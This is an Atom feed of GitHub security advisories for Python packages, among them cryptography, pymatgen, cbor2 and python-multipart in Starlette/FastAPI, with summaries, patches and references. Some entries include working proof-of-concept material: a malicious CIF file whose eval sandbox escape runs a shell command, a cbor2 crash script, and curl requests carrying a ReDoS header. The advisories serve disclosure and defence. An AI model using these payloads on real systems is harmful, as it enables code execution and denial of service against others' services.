<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://azu.github.io/github-advisory-database-rss/pip.rss</id>
    <title>Security Advisory for Python packages hosted at PyPI.org</title>
    <updated>2024-02-22T09:01:12.112Z</updated>
    <generator>github-advisory-database-rss</generator>
    <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Apip"/>
    <subtitle>Security Advisory for Python packages hosted at PyPI.org on GitHub</subtitle>
    <rights>github-advisory-database-rss</rights>
    <category term="CRITICAL"/>
    <category term="HIGH"/>
    <category term="MODERATE"/>
    <category term="LOW"/>
    <entry>
        <title type="html"><![CDATA[[cryptography] cryptography NULL pointer dereference with pkcs12.serialize_key_and_certificates when called with a non-matching certificate and private key and an hmac_hash override]]></title>
        <id>https://github.com/advisories/GHSA-6vqw-3v5j-54x4</id>
        <link href="https://github.com/advisories/GHSA-6vqw-3v5j-54x4"/>
        <updated>2024-02-21T22:45:35.000Z</updated>
        <content type="html"><![CDATA[<p>If <code>pkcs12.serialize_key_and_certificates</code> is called with both:</p>
<ol>
<li>A certificate whose public key did not match the provided private key</li>
<li>An <code>encryption_algorithm</code> with <code>hmac_hash</code> set (via <code>PrivateFormat.PKCS12.encryption_builder().hmac_hash(...)</code></li>
</ol>
<p>Then a NULL pointer dereference would occur, crashing the Python process.</p>
<p>This has been resolved, and now a <code>ValueError</code> is properly raised.</p>
<p>Patched in <a href="https://github.com/pyca/cryptography/pull/10423">https://github.com/pyca/cryptography/pull/10423</a></p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/pyca/cryptography/security/advisories/GHSA-6vqw-3v5j-54x4">https://github.com/pyca/cryptography/security/advisories/GHSA-6vqw-3v5j-54x4</a></li>
<li><a href="https://github.com/pyca/cryptography/pull/10423">https://github.com/pyca/cryptography/pull/10423</a></li>
<li><a href="https://github.com/pyca/cryptography/commit/97d231672763cdb5959a3b191e692a362f1b9e55">https://github.com/pyca/cryptography/commit/97d231672763cdb5959a3b191e692a362f1b9e55</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-26130">https://nvd.nist.gov/vuln/detail/CVE-2024-26130</a></li>
<li><a href="https://github.com/advisories/GHSA-6vqw-3v5j-54x4">https://github.com/advisories/GHSA-6vqw-3v5j-54x4</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-6vqw-3v5j-54x4</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-02-21T18:04:40.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[pymatgen] pymatgen vulnerable to arbitrary code execution when parsing a maliciously crafted JonesFaithfulTransformation transformation_string]]></title>
        <id>https://github.com/advisories/GHSA-vgv8-5cpj-qj2f</id>
        <link href="https://github.com/advisories/GHSA-vgv8-5cpj-qj2f"/>
        <updated>2024-02-21T19:33:08.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>A critical security vulnerability exists in the <code>JonesFaithfulTransformation.from_transformation_str()</code> method within the <code>pymatgen</code> library. This method insecurely utilizes eval() for processing input, enabling execution of arbitrary code when parsing untrusted input. This can be exploited when parsing a maliciously-created CIF file.</p>
<h3 id="details">Details</h3>
<p>The cause of the vulnerability is in <a href="https://github.com/materialsproject/pymatgen/blob/master/pymatgen/symmetry/settings.py#L97C1-L111C108">pymatgen/symmetry/settings.py#L97C1-L111C108</a>. The flawed code segment involves a regular expression operation followed by the use of <code>eval()</code>.</p>
<h4 id="vulnerable-code">Vulnerable code</h4>
<pre><code class="language-py">basis_change = [
    re.sub(r"(?&lt;=\w|\))(?=\() | (?&lt;=\))(?=\w) | (?&lt;=(\d|a|b|c))(?=([abc]))", r"*", string, flags=re.X)
    for string in basis_change
]
"""snip"""
([eval(x, {"__builtins__": None}, {"a": a, "b": b, "c": c}) for x in basis_change])
</code></pre>
<p>The use of eval, even with <code>__builtins__</code> set to <code>None</code>, is still a security risk. The <code>BuiltinImporter</code> class can be recovered with subclass traversal.</p>
<h3 id="poc">PoC</h3>
<p>The vulnerability can be exploited as follows:</p>
<p>Create a file <code>vuln.cif</code> with the following contents:</p>
<pre><code>data_5yOhtAoR
_audit_creation_date            2018-06-08
_audit_creation_method          "Pymatgen CIF Parser Arbitrary Code Execution Exploit"

loop_
_parent_propagation_vector.id
_parent_propagation_vector.kxkykz
k1 [0 0 0]

_space_group_magn.transform_BNS_Pp_abc  'a,b,[d for d in ().__class__.__mro__[1].__getattribute__ ( *[().__class__.__mro__[1]]+["__sub" + "classes__"]) () if d.__name__ == "BuiltinImporter"][0].load_module ("os").system ("touch pwned");0,0,0'


_space_group_magn.number_BNS  62.448
_space_group_magn.name_BNS  "P  n'  m  a'  "
</code></pre>
<p>Then, parse the cif file with the following code:</p>
<pre><code class="language-py">from pymatgen.io.cif import CifParser
parser = CifParser("vuln.cif")
structure = parser.parse_structures()
</code></pre>
<h3 id="credits">Credits</h3>
<p>This vulnerability was found and disclosed by <a href="https://github.com/SteakEnthusiast">William Khem-Marquez</a>.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/materialsproject/pymatgen/security/advisories/GHSA-vgv8-5cpj-qj2f">https://github.com/materialsproject/pymatgen/security/advisories/GHSA-vgv8-5cpj-qj2f</a></li>
<li><a href="https://github.com/materialsproject/pymatgen/commit/c231cbd3d5147ee920a37b6ee9dd236b376bcf5a">https://github.com/materialsproject/pymatgen/commit/c231cbd3d5147ee920a37b6ee9dd236b376bcf5a</a></li>
<li><a href="https://github.com/materialsproject/pymatgen/blob/master/pymatgen/symmetry/settings.py#L97C1-L111C108">https://github.com/materialsproject/pymatgen/blob/master/pymatgen/symmetry/settings.py#L97C1-L111C108</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-23346">https://nvd.nist.gov/vuln/detail/CVE-2024-23346</a></li>
<li><a href="https://github.com/advisories/GHSA-vgv8-5cpj-qj2f">https://github.com/advisories/GHSA-vgv8-5cpj-qj2f</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-vgv8-5cpj-qj2f</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2024-02-21T18:04:00.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[apache-airflow-providers-mongo] Improper Certificate Validation in apache airflow mongo hook]]></title>
        <id>https://github.com/advisories/GHSA-x5pm-h33q-cjrw</id>
        <link href="https://github.com/advisories/GHSA-x5pm-h33q-cjrw"/>
        <updated>2024-02-21T02:27:37.000Z</updated>
        <content type="html"><![CDATA[<p>When ssl&nbsp;was enabled for Mongo Hook, default settings included "allow_insecure" which caused that certificates were not validated. This was unexpected and undocumented.
Users are recommended to upgrade to version 4.0.0, which fixes this issue.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-25141">https://nvd.nist.gov/vuln/detail/CVE-2024-25141</a></li>
<li><a href="https://github.com/apache/airflow/pull/37214">https://github.com/apache/airflow/pull/37214</a></li>
<li><a href="https://lists.apache.org/thread/sqgbfqngjmn45ommmrgj7hvs7fgspsgm">https://lists.apache.org/thread/sqgbfqngjmn45ommmrgj7hvs7fgspsgm</a></li>
<li><a href="http://www.openwall.com/lists/oss-security/2024/02/20/5">http://www.openwall.com/lists/oss-security/2024/02/20/5</a></li>
<li><a href="https://github.com/advisories/GHSA-x5pm-h33q-cjrw">https://github.com/advisories/GHSA-x5pm-h33q-cjrw</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-x5pm-h33q-cjrw</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-02-20T21:30:26.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[pyhtml2pdf] Cross-site Scripting in Pyhtml2pdf]]></title>
        <id>https://github.com/advisories/GHSA-p3rv-qj56-2fqx</id>
        <link href="https://github.com/advisories/GHSA-p3rv-qj56-2fqx"/>
        <updated>2024-02-21T00:15:56.000Z</updated>
        <content type="html"><![CDATA[<p>Pyhtml2pdf version 0.0.6 allows an external attacker to remotely obtain</p>
<p>arbitrary local files. This is possible because the application does not</p>
<p>validate the HTML content entered by the user.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-1647">https://nvd.nist.gov/vuln/detail/CVE-2024-1647</a></li>
<li><a href="https://fluidattacks.com/advisories/oliver">https://fluidattacks.com/advisories/oliver</a></li>
<li><a href="https://github.com/advisories/GHSA-p3rv-qj56-2fqx">https://github.com/advisories/GHSA-p3rv-qj56-2fqx</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-p3rv-qj56-2fqx</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-02-20T03:30:57.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[cbor2] Potential buffer overflow in CBOR2 decoder]]></title>
        <id>https://github.com/advisories/GHSA-375g-39jq-vq7m</id>
        <link href="https://github.com/advisories/GHSA-375g-39jq-vq7m"/>
        <updated>2024-02-21T00:09:08.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>Ever since <a href="https://github.com/agronholm/cbor2/pull/204">https://github.com/agronholm/cbor2/pull/204</a> (or specifically <a href="https://github.com/agronholm/cbor2/commit/387755eacf0be35591a478d3c67fe10618a6d542">https://github.com/agronholm/cbor2/commit/387755eacf0be35591a478d3c67fe10618a6d542</a>) was merged, I can create a reproducible crash when running the snippet under PoC on a current Debian bullseye aarm64 on a Raspberry Pi 3 (I was <strong>not</strong> able to reproduce this on my x86_64 Laptop with Python 3.11; I suspect because there is enough memory to allocate still)</p>
<h2 id="details">Details</h2>
<h3 id="poc">PoC</h3>
<pre><code class="language-py">import json
import concurrent.futures
import cbor2

def test():
    obj = "x" * 131128
    cbor_enc = cbor2.dumps(obj)
    return cbor2.loads(cbor_enc)

with concurrent.futures.ProcessPoolExecutor() as executor:
    future = executor.submit(test)
    print(future.result())
</code></pre>
<pre><code>malloc(): unsorted double linked list corrupted
Traceback (most recent call last):
  File "test.py", line 14, in &lt;module&gt;
    print(future.result())
  File "/usr/lib/python3.9/concurrent/futures/_base.py", line 440, in result
    return self.__get_result()
  File "/usr/lib/python3.9/concurrent/futures/_base.py", line 389, in __get_result
    raise self._exception
concurrent.futures.process.BrokenProcessPool: A process in the process pool was terminated abruptly while the future was running or pending.
</code></pre>
<p>If one calls it without the indirection via the pool executor, a SystemError is shown that hides the buffer overflow.</p>
<pre><code class="language-py">import json
import cbor2

def test():
    obj = "x" * 131128
    cbor_enc = cbor2.dumps(obj)
    return cbor2.loads(cbor_enc)

print(test())
</code></pre>
<pre><code>Traceback (most recent call last):
  File "test.py", line 12, in &lt;module&gt;
    print(test())
  File "test.py", line 9, in test
    return cbor2.loads(cbor_enc)
SystemError: &lt;built-in function loads&gt; returned NULL without setting an error
</code></pre>
<h3 id="impact">Impact</h3>
<p>An attacker can crash a service using cbor2 to parse a CBOR binary by sending a long enough object.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/agronholm/cbor2/security/advisories/GHSA-375g-39jq-vq7m">https://github.com/agronholm/cbor2/security/advisories/GHSA-375g-39jq-vq7m</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-26134">https://nvd.nist.gov/vuln/detail/CVE-2024-26134</a></li>
<li><a href="https://github.com/agronholm/cbor2/pull/204">https://github.com/agronholm/cbor2/pull/204</a></li>
<li><a href="https://github.com/agronholm/cbor2/commit/387755eacf0be35591a478d3c67fe10618a6d542">https://github.com/agronholm/cbor2/commit/387755eacf0be35591a478d3c67fe10618a6d542</a></li>
<li><a href="https://github.com/agronholm/cbor2/commit/4de6991ba29bf2290d7b9d83525eda7d021873df">https://github.com/agronholm/cbor2/commit/4de6991ba29bf2290d7b9d83525eda7d021873df</a></li>
<li><a href="https://github.com/agronholm/cbor2/releases/tag/5.6.2">https://github.com/agronholm/cbor2/releases/tag/5.6.2</a></li>
<li><a href="https://github.com/advisories/GHSA-375g-39jq-vq7m">https://github.com/advisories/GHSA-375g-39jq-vq7m</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-375g-39jq-vq7m</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-02-21T00:09:03.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[scrapy] Scrapy denial of service vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-h7wm-ph43-c39p</id>
        <link href="https://github.com/advisories/GHSA-h7wm-ph43-c39p"/>
        <updated>2024-02-20T19:56:53.000Z</updated>
        <content type="html"><![CDATA[<p>Scrapy 1.4 allows remote attackers to cause a denial of service (memory consumption) via large files because arbitrarily many files are read into memory, which is especially problematic if the files are then individually written in a separate thread to a slow storage resource, as demonstrated by interaction between dataReceived (in core/downloader/handlers/http11.py) and S3FilesStore.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2017-14158">https://nvd.nist.gov/vuln/detail/CVE-2017-14158</a></li>
<li><a href="https://github.com/scrapy/scrapy/issues/482">https://github.com/scrapy/scrapy/issues/482</a></li>
<li><a href="http://blog.csdn.net/wangtua/article/details/75228728">http://blog.csdn.net/wangtua/article/details/75228728</a></li>
<li><a href="https://github.com/pypa/advisory-database/blob/8b7a4d62a95e8f605e5dfb4e0b4f299e6403dc12/vulns/scrapy/PYSEC-2017-83.yaml">https://github.com/pypa/advisory-database/blob/8b7a4d62a95e8f605e5dfb4e0b4f299e6403dc12/vulns/scrapy/PYSEC-2017-83.yaml</a></li>
<li><a href="https://github.com/advisories/GHSA-h7wm-ph43-c39p">https://github.com/advisories/GHSA-h7wm-ph43-c39p</a></li>
<li><a href="https://github.com/pypa/advisory-database/tree/main/vulns/scrapy/PYSEC-2017-83.yaml">https://github.com/pypa/advisory-database/tree/main/vulns/scrapy/PYSEC-2017-83.yaml</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-h7wm-ph43-c39p</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2022-05-17T01:16:31.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[webargs] Cross-Site Request Forgery in Webargs]]></title>
        <id>https://github.com/advisories/GHSA-fjq3-5pxw-4wj4</id>
        <link href="https://github.com/advisories/GHSA-fjq3-5pxw-4wj4"/>
        <updated>2024-02-20T15:57:22.000Z</updated>
        <content type="html"><![CDATA[<p>flaskparser.py in Webargs 5.x through 5.5.2 doesn't check that the Content-Type header is application/json when receiving JSON input. If the request body is valid JSON, it will accept it even if the content type is application/x-www-form-urlencoded. This allows for JSON POST requests to be made across domains, leading to CSRF.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2020-7965">https://nvd.nist.gov/vuln/detail/CVE-2020-7965</a></li>
<li><a href="https://github.com/marshmallow-code/webargs/commit/b9ee8b0aa668207a363d9fd21d967eeadb975c3e">https://github.com/marshmallow-code/webargs/commit/b9ee8b0aa668207a363d9fd21d967eeadb975c3e</a></li>
<li><a href="https://webargs.readthedocs.io/en/latest/changelog.html#b4-2020-01-28">https://webargs.readthedocs.io/en/latest/changelog.html#b4-2020-01-28</a></li>
<li><a href="https://webargs.readthedocs.io/en/latest/changelog.html#id11">https://webargs.readthedocs.io/en/latest/changelog.html#id11</a></li>
<li><a href="https://github.com/advisories/GHSA-fjq3-5pxw-4wj4">https://github.com/advisories/GHSA-fjq3-5pxw-4wj4</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-fjq3-5pxw-4wj4</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2021-04-07T21:06:30.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[Zope] Zope Denial of Service (DoS) vulnerability in ZServer]]></title>
        <id>https://github.com/advisories/GHSA-qh4q-fwf8-qqrw</id>
        <link href="https://github.com/advisories/GHSA-qh4q-fwf8-qqrw"/>
        <updated>2024-02-18T05:06:45.000Z</updated>
        <content type="html"><![CDATA[<p>ZServer in Zope 2.10.x before 2.10.12 and 2.11.x before 2.11.7 allows remote attackers to cause a denial of service (crash of worker threads) via vectors that trigger uncaught exceptions.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2010-3198">https://nvd.nist.gov/vuln/detail/CVE-2010-3198</a></li>
<li><a href="https://bugs.launchpad.net/zope2/+bug/627988">https://bugs.launchpad.net/zope2/+bug/627988</a></li>
<li><a href="https://mail.zope.org/pipermail/zope-announce/2010-September/002247.html">https://mail.zope.org/pipermail/zope-announce/2010-September/002247.html</a></li>
<li><a href="http://www.zope.org/Products/Zope/2.10.12/CHANGES.txt">http://www.zope.org/Products/Zope/2.10.12/CHANGES.txt</a></li>
<li><a href="http://www.zope.org/Products/Zope/2.11.7/CHANGES.txt">http://www.zope.org/Products/Zope/2.11.7/CHANGES.txt</a></li>
<li><a href="https://github.com/zopefoundation/Zope/commit/0f2f56f63e4a4d695ee670e02b317e900550dbac">https://github.com/zopefoundation/Zope/commit/0f2f56f63e4a4d695ee670e02b317e900550dbac</a></li>
<li><a href="https://github.com/zopefoundation/Zope/commit/e03a5f036d42ed2426886c9035fe018eeec65de4">https://github.com/zopefoundation/Zope/commit/e03a5f036d42ed2426886c9035fe018eeec65de4</a></li>
<li><a href="https://web.archive.org/web/20200229173503/http://www.securityfocus.com/bid/42939">https://web.archive.org/web/20200229173503/http://www.securityfocus.com/bid/42939</a></li>
<li><a href="https://github.com/advisories/GHSA-qh4q-fwf8-qqrw">https://github.com/advisories/GHSA-qh4q-fwf8-qqrw</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-qh4q-fwf8-qqrw</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2022-05-17T05:48:31.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[Zope] Zope Denial of Service (DoS) vulnerability in ZServer]]></title>
        <id>https://github.com/advisories/GHSA-qh4q-fwf8-qqrw</id>
        <link href="https://github.com/advisories/GHSA-qh4q-fwf8-qqrw"/>
        <updated>2024-02-18T05:06:45.000Z</updated>
        <content type="html"><![CDATA[<p>ZServer in Zope 2.10.x before 2.10.12 and 2.11.x before 2.11.7 allows remote attackers to cause a denial of service (crash of worker threads) via vectors that trigger uncaught exceptions.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2010-3198">https://nvd.nist.gov/vuln/detail/CVE-2010-3198</a></li>
<li><a href="https://bugs.launchpad.net/zope2/+bug/627988">https://bugs.launchpad.net/zope2/+bug/627988</a></li>
<li><a href="https://mail.zope.org/pipermail/zope-announce/2010-September/002247.html">https://mail.zope.org/pipermail/zope-announce/2010-September/002247.html</a></li>
<li><a href="http://www.zope.org/Products/Zope/2.10.12/CHANGES.txt">http://www.zope.org/Products/Zope/2.10.12/CHANGES.txt</a></li>
<li><a href="http://www.zope.org/Products/Zope/2.11.7/CHANGES.txt">http://www.zope.org/Products/Zope/2.11.7/CHANGES.txt</a></li>
<li><a href="https://github.com/zopefoundation/Zope/commit/0f2f56f63e4a4d695ee670e02b317e900550dbac">https://github.com/zopefoundation/Zope/commit/0f2f56f63e4a4d695ee670e02b317e900550dbac</a></li>
<li><a href="https://github.com/zopefoundation/Zope/commit/e03a5f036d42ed2426886c9035fe018eeec65de4">https://github.com/zopefoundation/Zope/commit/e03a5f036d42ed2426886c9035fe018eeec65de4</a></li>
<li><a href="https://web.archive.org/web/20200229173503/http://www.securityfocus.com/bid/42939">https://web.archive.org/web/20200229173503/http://www.securityfocus.com/bid/42939</a></li>
<li><a href="https://github.com/advisories/GHSA-qh4q-fwf8-qqrw">https://github.com/advisories/GHSA-qh4q-fwf8-qqrw</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-qh4q-fwf8-qqrw</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2022-05-17T05:48:31.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[starlette] python-multipart vulnerable to Content-Type Header ReDoS]]></title>
        <id>https://github.com/advisories/GHSA-2jv5-9r88-3w3p</id>
        <link href="https://github.com/advisories/GHSA-2jv5-9r88-3w3p"/>
        <updated>2024-02-16T23:41:49.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>When using form data, <code>python-multipart</code> uses a Regular Expression to parse the HTTP <code>Content-Type</code> header, including options.</p>
<p>An attacker could send a custom-made <code>Content-Type</code> option that is very difficult for the RegEx to process, consuming CPU resources and stalling indefinitely (minutes or more) while holding the main event loop. This means that process can't handle any more requests.</p>
<p>This can create a ReDoS (Regular expression Denial of Service): <a href="https://owasp.org/www-community/attacks/Regular_expression_Denial_of_Service_-_ReDoS">https://owasp.org/www-community/attacks/Regular_expression_Denial_of_Service_-_ReDoS</a></p>
<p>This only applies when the app uses form data, parsed with <code>python-multipart</code>.</p>
<h3 id="details">Details</h3>
<p>A regular HTTP <code>Content-Type</code> header could look like:</p>
<pre><code>Content-Type: text/html; charset=utf-8
</code></pre>
<p><code>python-multipart</code> parses the option with this RegEx: <a href="https://github.com/andrew-d/python-multipart/blob/d3d16dae4b061c34fe9d3c9081d9800c49fc1f7a/multipart/multipart.py#L72-L74">https://github.com/andrew-d/python-multipart/blob/d3d16dae4b061c34fe9d3c9081d9800c49fc1f7a/multipart/multipart.py#L72-L74</a></p>
<p>A custom option could be made and sent to the server to break it with:</p>
<pre><code>Content-Type: application/x-www-form-urlencoded; !=\"\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
</code></pre>
<h3 id="poc">PoC</h3>
<p>Create a simple WSGI application, that just parses the <code>Content-Type</code>, and run it with <code>python main.py</code>:</p>
<pre><code class="language-Python"># main.py
from wsgiref.simple_server import make_server
from wsgiref.validate import validator

from multipart.multipart import parse_options_header


def simple_app(environ, start_response):
    _, _ = parse_options_header(environ["CONTENT_TYPE"])

    start_response("200 OK", [("Content-type", "text/plain")])
    return [b"Ok"]


httpd = make_server("", 8123, validator(simple_app))
print("Serving on port 8123...")
httpd.serve_forever()
</code></pre>
<p>Then send the attacking request with:</p>
<pre><code class="language-console">$ curl -v -X 'POST' -H $'Content-Type: application/x-www-form-urlencoded; !=\"\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\' --data-binary 'input=1' 'http://localhost:8123/'
</code></pre>
<h3 id="impact">Impact</h3>
<p>It's a ReDoS, (Regular expression Denial of Service), it only applies to those reading form data. This way it also affects other libraries using Starlette, like FastAPI.</p>
<h3 id="original-report">Original Report</h3>
<p>This was originally reported to FastAPI as an email to <a href="mailto:security@tiangolo.com">security@tiangolo.com</a>, sent via <a href="https://huntr.com/">https://huntr.com/</a>, the original reporter is Marcello, <a href="https://github.com/byt3bl33d3r">https://github.com/byt3bl33d3r</a></p>
<details>
<summary>Original report to FastAPI</summary>

<p>Hey Tiangolo!</p>
<p>My name's Marcello and I work on the ProtectAI/Huntr Threat Research team, a few months ago we got a report (from @nicecatch2000) of a ReDoS affecting another very popular Python web framework. After some internal research, I found that FastAPI is vulnerable to the same ReDoS under certain conditions (only when it parses Form data not JSON).</p>
<p>Here are the details: I'm using the latest version of FastAPI (0.109.0) and the following code:</p>
<pre><code class="language-Python">from typing import Annotated
from fastapi.responses import HTMLResponse
from fastapi import FastAPI,Form
from pydantic import BaseModel

class Item(BaseModel):
    username: str

app = FastAPI()

@app.get("/", response_class=HTMLResponse)
async def index():
    return HTMLResponse("Test", status_code=200)

@app.post("/submit/")
async def submit(username: Annotated[str, Form()]):
    return {"username": username}

@app.post("/submit_json/")
async def submit_json(item: Item):
    return {"username": item.username}
</code></pre>
<p>I'm running the above with uvicorn with the following command:</p>
<pre><code class="language-console">uvicorn server:app
</code></pre>
<p>Then run the following cUrl command:</p>
<pre><code>curl -v -X 'POST' -H $'Content-Type: application/x-www-form-urlencoded; !=\"\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\' --data-binary 'input=1' 'http://localhost:8000/submit/'
</code></pre>
<p>You'll see the server locks up, is unable to serve anymore requests and one CPU core is pegged to 100%</p>
<p>You can even start uvicorn with multiple workers with the --workers 4 argument and as long as you send (workers + 1) requests you'll completely DoS the FastApi server.</p>
<p>If you try submitting Json to the /submit_json endpoint with the malicious Content-Type header you'll see it isn't vulnerable. So this only affects FastAPI when it parses Form data.</p>
<p>Cheers</p>
<h4 id="impact-1">Impact</h4>
<p>An attacker is able to cause a DoS on a FastApi server via a malicious Content-Type header if it parses Form data.</p>
<h4 id="occurrences">Occurrences</h4>
<p><a href="https://github.com/tiangolo/fastapi/blob/d74b3b25659b42233a669f032529880de8bd6c2d/fastapi/params.py#L586">params.py L586</a></p>
</details>
### References

<ul>
<li><a href="https://github.com/Kludex/python-multipart/security/advisories/GHSA-2jv5-9r88-3w3p">https://github.com/Kludex/python-multipart/security/advisories/GHSA-2jv5-9r88-3w3p</a></li>
<li><a href="https://github.com/Kludex/python-multipart/commit/20f0ef6b4e4caf7d69a667c54dff57fe467109a4">https://github.com/Kludex/python-multipart/commit/20f0ef6b4e4caf7d69a667c54dff57fe467109a4</a></li>
<li><a href="https://github.com/andrew-d/python-multipart/blob/d3d16dae4b061c34fe9d3c9081d9800c49fc1f7a/multipart/multipart.py#L72-L74">https://github.com/andrew-d/python-multipart/blob/d3d16dae4b061c34fe9d3c9081d9800c49fc1f7a/multipart/multipart.py#L72-L74</a></li>
<li><a href="https://github.com/encode/starlette/security/advisories/GHSA-93gm-qmq6-w238">https://github.com/encode/starlette/security/advisories/GHSA-93gm-qmq6-w238</a></li>
<li><a href="https://github.com/tiangolo/fastapi/security/advisories/GHSA-qf9m-vfgh-m389">https://github.com/tiangolo/fastapi/security/advisories/GHSA-qf9m-vfgh-m389</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-24762">https://nvd.nist.gov/vuln/detail/CVE-2024-24762</a></li>
<li><a href="https://github.com/encode/starlette/commit/13e5c26a27f4903924624736abd6131b2da80cc5">https://github.com/encode/starlette/commit/13e5c26a27f4903924624736abd6131b2da80cc5</a></li>
<li><a href="https://github.com/tiangolo/fastapi/commit/9d34ad0ee8a0dfbbcce06f76c2d5d851085024fc">https://github.com/tiangolo/fastapi/commit/9d34ad0ee8a0dfbbcce06f76c2d5d851085024fc</a></li>
<li><a href="https://github.com/pypa/advisory-database/tree/main/vulns/fastapi/PYSEC-2024-38.yaml">https://github.com/pypa/advisory-database/tree/main/vulns/fastapi/PYSEC-2024-38.yaml</a></li>
<li><a href="https://github.com/tiangolo/fastapi/releases/tag/0.109.1">https://github.com/tiangolo/fastapi/releases/tag/0.109.1</a></li>
<li><a href="https://github.com/advisories/GHSA-2jv5-9r88-3w3p">https://github.com/advisories/GHSA-2jv5-9r88-3w3p</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-2jv5-9r88-3w3p</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-02-12T17:28:12.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[fastapi] python-multipart vulnerable to Content-Type Header ReDoS]]></title>
        <id>https://github.com/advisories/GHSA-2jv5-9r88-3w3p</id>
        <link href="https://github.com/advisories/GHSA-2jv5-9r88-3w3p"/>
        <updated>2024-02-16T23:41:49.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>When using form data, <code>python-multipart</code> uses a Regular Expression to parse the HTTP <code>Content-Type</code> header, including options.</p>
<p>An attacker could send a custom-made <code>Content-Type</code> option that is very difficult for the RegEx to process, consuming CPU resources and stalling indefinitely (minutes or more) while holding the main event loop. This means that process can't handle any more requests.</p>
